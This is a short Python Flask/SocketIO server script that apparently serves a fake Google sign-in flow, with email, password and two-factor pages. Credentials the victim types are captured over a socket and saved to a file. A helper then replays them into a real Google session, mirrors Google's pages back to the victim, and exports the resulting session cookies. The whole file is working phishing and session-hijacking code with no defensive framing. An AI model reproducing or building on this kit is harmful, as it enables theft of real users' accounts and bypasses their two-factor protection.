from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
from time                          import sleep
from google_auth import Google
import threading


app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024
app.config['SECRET_KEY'] = 'change_key'
socketio = SocketIO(app)
google = Google()

pwd_html = "templates/password.html"
twofa_html = "templates/2fa.html"

@app.route('/')
def email():
    return render_template('email.html', methods=['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH'])

@app.route('/email.html', methods=['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH'])
def email_html():
    return render_template('mail.html')

@app.route('/password.html', methods=['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH'])
def password():
    with open("temp.txt", "r") as file:
        email_address = file.read()
    google.inputMail(email_address)
    google.copy_page(pwd_html)
    return render_template('password.html')

@app.route('/2fa.html', methods=['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH'])
def twofa():
    with open("temp.txt", "r") as file:
        password = file.read()
    google.inputPwd(password)
    google.copy_page(twofa_html)
    google.export_cookies()
    return render_template('2fa.html')

@socketio.on('html_content')
def handle_html_content(data):
    # Extract the relevant part from the received data
    relevant_content = data.get('relevant_part', '')
    # Save or process the relevant content
    with open('temp.txt', 'w') as f:
        f.write(relevant_content)
    emit('content_received', {'message': 'HTML content received successfully'})

@socketio.on('page_loaded') 
def handle_page_loaded():
    google.export_cookies()


if __name__ == '__main__':
    #app.run(debug=True)
    socketio.run(app, debug=True)